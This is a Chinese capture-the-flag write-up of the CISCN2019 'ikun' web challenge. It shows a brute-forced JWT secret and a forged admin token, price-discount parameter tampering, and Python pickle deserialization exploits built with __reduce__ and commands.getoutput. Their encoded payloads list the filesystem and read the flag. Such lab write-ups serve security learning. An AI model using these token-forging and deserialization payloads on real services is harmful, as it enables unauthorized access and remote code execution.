# [CISCN2019 华北赛区 Day1 Web2]ikun
![](<./img/Pasted image 20221226095504.png>)

---

![](<./img/Pasted image 20221226095527.png>)

草，地下组织是吧（

先注册一个账号试试

![](<./img/Pasted image 20221226095732.png>)

扫目录好像没扫出什么东西

![](<./img/Pasted image 20221226102523.png>)

有个jwt
```
JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkNyYWNrVEMifQ.EROtea15Wqt7t3TbLzHl4silV3GhEDvAY8v6HcBiACw
```

尝试破解

```
SECRET FOUND: 1Kun
Time taken (sec): 11.454
```

伪造成`admin`

![](<./img/Pasted image 20221226105231.png>)

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo
```

![](<./img/Pasted image 20221226105506.png>)
![](<./img/Pasted image 20221226105616.png>)

原来是让我们在首页找`lv6`嘛QAQ

当然是自动化（这辈子都是不可能手动去找的）
```python
import os
import requests
import time

url = 'http://d4c2ad15-e197-4f2a-860c-dc3a47dfe33e.node4.buuoj.cn:81/shop'

for i in range(1, 100000):
    response = requests.get(url, {'page': i})
    if response.text.find('lv6.png') > 0:
        print(i)
        time.sleep(0.1)
        break
```

> 180

![](<./img/Pasted image 20221226110421.png>)

好恶臭的价格啊（恼

![](<./img/Pasted image 20221226110619.png>)

```
_xsrf=2%7C28c03bf5%7C4c4a42fbd604997e06764c102a28edea%7C1672021882&id=1624&price=1145141919.0&discount=0.8
```
谁家`discount`这么搞的QwQ

改成`0.00000001`（居然不能直接改成`0`）

![](<./img/Pasted image 20221226110932.png>)

![](<./img/Pasted image 20221226111038.png>)

大草

![](<./img/Pasted image 20221226111057.png>)

先获取源码

```
/static/asd1f654e683wq/www.zip
```

![](<./img/Pasted image 20221226111229.png>)

高情商：节约流量

低情商：百度网盘==

![](<./img/Pasted image 20221226112353.png>)

![](<./img/Pasted image 20221226112419.png>)

```python
    @tornado.web.authenticated
    def post(self, *args, **kwargs):
        try:
            become = self.get_argument('become')
            p = pickle.loads(urllib.unquote(become))
            return self.render('form.html', res=p, member=1)
        except:
            return self.render('form.html', res='This is Black Technology!', member=0)
```

```html
<div class="ui segment">{{ res }}</div>
```

`python`里面通过`__reduce__`魔术方法来[自定义pickle反序列化行为](https://stackoverflow.com/questions/19855156/whats-the-exact-usage-of-reduce-in-pickler)，通过

```python
import pickle
import urllib
import commands

class payload(object):
	def __reduce__(self):
		return (commands.getoutput, ('ls /',))

p = payload()
p = urllib.quote(pickle.dumps(p))
print(p)

```
用`python2`是坏文明（恼

```
ccommands%0Agetoutput%0Ap0%0A%28S%27ls%20/%27%0Ap1%0Atp2%0ARp3%0A.
```

```
app bin dev etc flag.txt home lib media mnt opt proc root run sbin srv sys tmp usr var
```

```python
import pickle
import urllib
import commands

class payload(object):
	def __reduce__(self):
		return (commands.getoutput, ('cat /flag.txt',))

p = payload()
p = urllib.quote(pickle.dumps(p))
print(p)

```

```
ccommands%0Agetoutput%0Ap0%0A%28S%27cat%20/flag.txt%27%0Ap1%0Atp2%0ARp3%0A.
```

```
flag{3811325b-5913-45d0-b8e1-bd7b8e76cb65}
```

#Web #jwt #暴力破解 #源码泄漏 #python #pickle #魔术方法 #RCE #反序列化 